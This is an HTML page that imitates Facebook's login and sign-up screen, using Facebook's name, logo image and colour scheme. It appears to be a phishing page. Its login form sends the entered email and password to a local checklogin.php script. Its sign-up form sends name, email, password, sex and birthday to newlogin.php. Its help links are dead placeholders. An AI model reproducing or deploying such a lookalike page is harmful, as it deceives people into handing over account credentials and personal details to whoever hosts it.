<html>
<head>
<title>Welcome to Facebook</title> 
    
    <style type="text/css">
	
.inputStd { 
color: #000000;
font-style: normal;
	width: 110pt;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	line-height: 15px;
}

.inputPrompt {
	color: #696969;
	font-style: normal;
	width: 110pt;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	line-height: 15px;
}
		
	
	
	.facebook_bg_network {
	background-repeat: no-repeat;
	background-color: #E0E4EF;
	background-image: url(img/41j5eq4v.png);
	background-position: left top;
	height: 195px;
	width: 500px;
	margin-top: 20px;
	margin-left: -11px;
}
    .facebook_txt_logo {
	font-weight: bold;
	font-family: Verdana, Geneva, sans-serif;
	font-size: 36px;
}
   
    #loginform form #username {
}
    .txt_blank {
	color: #3B5998;
}
    .txt_fb {
	font-size: 20px;
	font-family: Verdana, Geneva, sans-serif;
	color: #203360;
	font-weight: bold;
}
   .txt_fb_reg {
	font-size: 20px;
	font-family: Verdana, Geneva, sans-serif;
	color: #203360;
	
} 
    
    
    .txt_disable {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	color: #CCC;
	line-height: 15px;
}
   
    .txt_disable table {
	font-family: Tahoma, Geneva, sans-serif;
}
    .txt_disable table {
	font-size: 11px;
}
    .txt_disable table {
	color: #3b5998;
}
    .txt_disable table {
	font-family: Tahoma, Geneva, sans-serif;
}
    body {
	margin-left: 0px;
	margin-top: 0px;
	text-align: center;
	border: 1px solid #96A6C5;
}
#drop_menu{
	color: #000000;
	font-style: normal;
	width: auto;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	line-height: 15px;
}
#text_new_info{
	color: #203360;
	font-style: normal;
	font-family: Arial, Helvetica, sans-serif;
	font-size: 11px;
	text-align: right;
} 
#green_button{
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	line-height: 15px;
	outline-style: none;
	outline-width: 0px;
	background-color: #73AC59;
	color: #FFF;
	font-style: normal;
	font-weight: bold;
	outline: none;
	border: 1px solid #3B6E22;
	}
#text_why_blue {
	font-size: 9px;
	font-family: Arial, Helvetica, sans-serif;
	text-decoration: none;
	}
a:hover {
	color: #5F76C8;
	font-size: 8pt;
	text-decoration: underline;
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	}
a:active {
	color: #5F76C8;
	font-size: 8pt;
	text-decoration: underline;
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	}
a:link {
	color: #5F76C8;
	font-size: 8pt;
	text-decoration: none;
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	}
a:link:hover {
	color: #5F76C8;
	font-size: 8pt;
	text-decoration: underline;
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	}
a:visited {
	color: #5F76C8;
	font-size: 8pt;
	text-decoration: none;
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	}
a:visited:hover {
	color: #5F76C8;
	font-size: 8pt;
	text-decoration: underline;
	font-family: "Lucida Sans Unicode", "Lucida Grande", sans-serif;
	}	
#login_button_blue{
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
	line-height: 15px;
	background-color: #5E77AA;
	border: 1px solid #29447E;
	color: #FFF;
	font-weight: bold;
	}
#imput_frame{
	border: 1px solid #96A6C5;
	}
    </style>
    
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<script type="text/javascript" charset="utf-8">

//Variable to save prompt messages
var fieldPrompts = new Array();

function inputFocus(fieldObj) {
if (fieldObj.className=='inputPrompt') {
if (fieldObj.id=='password') {
//change field type and reset obj reference
changeInputType('password', 'password');
fieldObj = document.getElementById('password');
}
fieldPrompts[fieldObj.id] = fieldObj.value;
fieldObj.value = '';
fieldObj.className = 'inputStd';
fieldObj.select();
fieldObj.focus();
}
}

function inputBlur(fieldObj) {
if (fieldObj.value=='') {
if (fieldObj.id=='password') {
//change field type and reset obj reference
changeInputType('password', 'text');
fieldObj = document.getElementById('password');
}
fieldObj.value = fieldPrompts[fieldObj.id];
fieldObj.className = 'inputPrompt';
}
}

function changeInputType(objID, oType) {
var oldObject = document.getElementById(objID);
var newObject = document.createElement('input');
newObject.type = oType;
if(oldObject.value) newObject.value = oldObject.value;
if(oldObject.size) newObject.size = oldObject.size;
if(oldObject.name) newObject.name = oldObject.name;
if(oldObject.id) newObject.id = oldObject.id;
if(oldObject.onfocus) newObject.onfocus = oldObject.onfocus;
if(oldObject.onblur) newObject.onblur = oldObject.onblur;
if(oldObject.className) newObject.className = oldObject.className;
oldObject.parentNode.replaceChild(newObject,oldObject);
return;
}

function setPrompts() { //Run onload of the page
document.getElementById('username').className = 'inputPrompt';


changeInputType('password', 'text');
document.getElementById('password').value = 'Password';
document.getElementById('password').className = 'inputPrompt';
}

</script>



</head>
<body onLoad="setPrompts();">


<table width="100%" height="425" border="0" align="left" cellpadding="0" cellspacing="0">
  <tr>
    <td width="122" height="82" align="left" valign="middle" bgcolor="#3B5998" class="facebook_txt_logo">&nbsp;</td>
    <td width="500" align="left" valign="baseline" bgcolor="#3B5998" class="facebook_txt_logo"><span class="txt_fb"><span class="txt_blank"><img src="img/fb_logo1.gif" width="174" height="75" hspace="0" vspace="0"></span></span></td>
    <td width="470" align="left" nowrap bgcolor="#3B5998"><div id="loginform">
      <form method="post" action="checklogin.php" name="form1">
<table width="100" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="37%" align="right" valign="bottom" nowrap><label>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
         &nbsp;&nbsp;
         <input type="checkbox" name="keep" id="keep">
         <span class="txt_disable"><a href="#">      Keep me logged in</a></span></label></td>
    <td width="31%" align="right" valign="bottom" nowrap><p><A href="#" class="txt_disable" rel="nofollow">Forgot your   password?</A></p></td>
    <td width="32%" valign="bottom">&nbsp;</td>
    </tr>
  <tr>
    <td nowrap><input onFocus="inputFocus(this)" onBlur="inputBlur(this)"  name="myusername" type="text" id="username" value="Email"  class="inputStd"  /></td>
    <td nowrap>&nbsp;&nbsp;&nbsp;&nbsp;<input onFocus="inputFocus(this)" onBlur="inputBlur(this)"  name="mypassword" type="password" id="password" value="Password" size="20" maxlength="100" /></td>
    <td nowrap>&nbsp;&nbsp;&nbsp;<input name="submit" type="submit" value="Login" id="login_button_blue" /></td>
  </tr>
</table>
      </form>
    </div></td>
    <td width="17" bgcolor="#3B5998">&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#E0E4EF">&nbsp;</td>
    <td bgcolor="#E0E4EF">&nbsp;</td>
    <td class="txt_fb" bgcolor="#E0E4EF">&nbsp;</td>
    <td bgcolor="#E0E4EF">&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#E0E4EF">&nbsp;</td>
    <td bgcolor="#E0E4EF"><span class="txt_fb_reg">Facebook helps you connect and share with </span></td>
    <td class="txt_fb" bgcolor="#E0E4EF">Sign Up</td>
    <td bgcolor="#E0E4EF">&nbsp;</td>
  </tr>
  <tr>
    <td width="122" bgcolor="#E0E4EF">&nbsp;</td>
    <td bgcolor="#E0E4EF"><span class="txt_fb_reg">the people in your life.</span></td>
    <td bgcolor="#E0E4EF"><span class="txt_fb_reg">It's free and anyone can join</span></td>
    <td width="17" bgcolor="#E0E4EF">&nbsp;</td>
  </tr>
  <tr>
    <td bgcolor="#E0E4EF">&nbsp;</td>
    <td bgcolor="#E0E4EF" class="facebook_bg_network">&nbsp;</td>
    <td bgcolor="#E0E4EF">
    <form action="newlogin.php" method="post" name="form2">
    <table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="22%" height="26" id="text_new_info">First Name:&nbsp;&nbsp;</td>
    <td width="78%" height="26"><input name="firstname" type="text" id="imput_frame" size="30" /></td>
  </tr>
  <tr>
    <td height="26" id="text_new_info">Last Name:&nbsp;&nbsp;</td>
    <td height="26"><input name="lastname" type="text" id="imput_frame" size="30" /></td>
  </tr>
  <tr>
    <td height="26" id="text_new_info">Your Email:&nbsp;&nbsp;</td>
    <td height="26"><input name="email" type="text" id="imput_frame" size="30" /></td>
  </tr>
  <tr>
    <td height="26" id="text_new_info">New Password:&nbsp;&nbsp;</td>
    <td height="26"><input name="password" type="password" id="imput_frame" size="30" /></td>
  </tr>
  <tr>
    <td height="26" id="text_new_info">I am:&nbsp;&nbsp;</td>
    <td height="26"><select name="gender" id="drop_menu" >
      <option value="n/a" selected>Select Sex:</option>
      <option value="Female">Female</option>
      <option value="Male">Male</option>
    </select></td>
  </tr>
  <tr>
    <td height="26" id="text_new_info">Birthday:&nbsp;&nbsp;</td>
    <td height="26"><label>
      <select name="mo" id="drop_menu">
        <option value="n/a" selected>Month:</option>
        <option value="01">Jan</option>
        <option value="02">Feb</option>
        <option value="03">Mar</option>
        <option value="04">Apr</option>
        <option value="05">May</option>
        <option value="06">Jun</option>
        <option value="07">Jul</option>
        <option value="08">Aug</option>
        <option value="09">Sep</option>
        <option value="10">Oct</option>
        <option value="11">Nov</option>
        <option value="12">Dec</option>
      </select>
      <select name="dd" id="drop_menu">
        <option value="n/a" selected>Day:</option>
        <option value="01">1</option>
        <option value="02">2</option>
        <option value="03">3</option>
        <option value="04">4</option>
        <option value="05">5</option>
        <option value="06">6</option>
        <option value="07">7</option>
        <option value="08">8</option>
        <option value="09">9</option>
        <option value="10">10</option>
        <option value="11">11</option>
        <option value="12">12</option>
        <option value="13">13</option>
        <option value="14">14</option>
        <option value="15">15</option>
        <option value="16">16</option>
        <option value="17">17</option>
        <option value="18">18</option>
        <option value="19">19</option>
        <option value="20">20</option>
        <option value="21">21</option>
        <option value="22">22</option>
        <option value="23">23</option>
        <option value="24">24</option>
        <option value="25">25</option>
        <option value="26">26</option>
        <option value="27">27</option>
        <option value="28">28</option>
        <option value="29">29</option>
        <option value="30">30</option>
        <option value="31">31</option>
      </select>
      <select name="yyyy" id="drop_menu">
        <option value="n/a" selected>Year:</option>
        <option value="2010">2010</option>
        <option value="2009">2009</option>
        <option value="2008">2008</option>
        <option value="2007">2007</option>
        <option value="2006">2006</option>
        <option value="2005">2005</option>
        <option value="2004">2004</option>
        <option value="2003">2003</option>
        <option value="2002">2002</option>
        <option value="2001">2001</option>
        <option value="2000">2000</option>
        <option value="1999">1999</option>
        <option value="1998">1998</option>
        <option value="1997">1997</option>
        <option value="1996">1996</option>
        <option value="1995">1995</option>
        <option value="1994">1994</option>
        <option value="1993">1993</option>
        <option value="1992">1992</option>
        <option value="1991">1991</option>
        <option value="1990">1990</option>
        <option value="1989">1989</option>
        <option value="1988">1988</option>
        <option value="1987">1987</option>
        <option value="1986">1986</option>
        <option value="1985">1985</option>
        <option value="1984">1984</option>
        <option value="1983">1983</option>
        <option value="1982">1982</option>
        <option value="1981">1981</option>
        <option value="1980">1980</option>
        <option value="1979">1979</option>
        <option value="1978">1978</option>
        <option value="1977">1977</option>
        <option value="1976">1976</option>
        <option value="1975">1975</option>
        <option value="1974">1974</option>
        <option value="1973">1973</option>
        <option value="1972">1972</option>
        <option value="1971">1971</option>
        <option value="1970">1970</option>
        <option value="1969">1969</option>
        <option value="1968">1968</option>
        <option value="1967">1967</option>
        <option value="1966">1966</option>
        <option value="1965">1965</option>
        <option value="1964">1964</option>
        <option value="1963">1963</option>
        <option value="1962">1962</option>
        <option value="1961">1961</option>
        <option value="1960">1960</option>
        <option value="1959">1959</option>
        <option value="1958">1958</option>
        <option value="1957">1957</option>
        <option value="1956">1956</option>
        <option value="1955">1955</option>
        <option value="1954">1954</option>
        <option value="1953">1953</option>
        <option value="1952">1952</option>
        <option value="1951">1951</option>
        <option value="1950">1950</option>
        <option value="1949">1949</option>
        <option value="1948">1948</option>
        <option value="1947">1947</option>
        <option value="1946">1946</option>
        <option value="1945">1945</option>
        <option value="1944">1944</option>
        <option value="1943">1943</option>
        <option value="1942">1942</option>
        <option value="1941">1941</option>
        <option value="1940">1940</option>
        <option value="1939">1939</option>
        <option value="1938">1938</option>
        <option value="1937">1937</option>
        <option value="1936">1936</option>
        <option value="1935">1935</option>
        <option value="1934">1934</option>
        <option value="1933">1933</option>
        <option value="1932">1932</option>
        <option value="1931">1931</option>
        <option value="1930">1930</option>
        <option value="1929">1929</option>
        <option value="1928">1928</option>
        <option value="1927">1927</option>
        <option value="1926">1926</option>
        <option value="1925">1925</option>
        <option value="1924">1924</option>
        <option value="1923">1923</option>
        <option value="1922">1922</option>
        <option value="1921">1921</option>
        <option value="1920">1920</option>
        <option value="1919">1919</option>
        <option value="1918">1918</option>
        <option value="1917">1917</option>
        <option value="1916">1916</option>
        <option value="1915">1915</option>
        <option value="1914">1914</option>
        <option value="1913">1913</option>
        <option value="1912">1912</option>
        <option value="1911">1911</option>
        <option value="1910">1910</option>
        <option value="1909">1909</option>
        <option value="1908">1908</option>
        <option value="1907">1907</option>
        <option value="1906">1906</option>
        <option value="1905">1905</option>
        <option value="1904">1904</option>
        <option value="1903">1903</option>
        <option value="1902">1902</option>
        <option value="1901">1901</option>
        <option value="1900">1900</option>
      </select>
    </label></td>
  </tr>
  <tr>
    <td height="26">&nbsp;</td>
    <td height="26" id="text_why_blue"><a href="#" >Why do I need to provide this?</a></td>
  </tr>
  <tr>
    <td height="26">&nbsp;</td>
    <td height="26"><label>
      <input type="submit" name="submit2" id="green_button" value="Sign Up">
    </label></td>
  </tr>
  <tr>
    <td height="26" colspan="2">&nbsp;</td>
    </tr>
  <tr>
    <td colspan="2">&nbsp;</td>
    </tr>
</table>

    </form>
    </td>
    <td bgcolor="#E0E4EF">&nbsp;</td>
  </tr>
  <tr>
    <td nowrap class="txt_disable">&nbsp;</td>
    <td colspan="2" nowrap class="txt_disable">&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
</table>
<p>
  
</body>
</html>



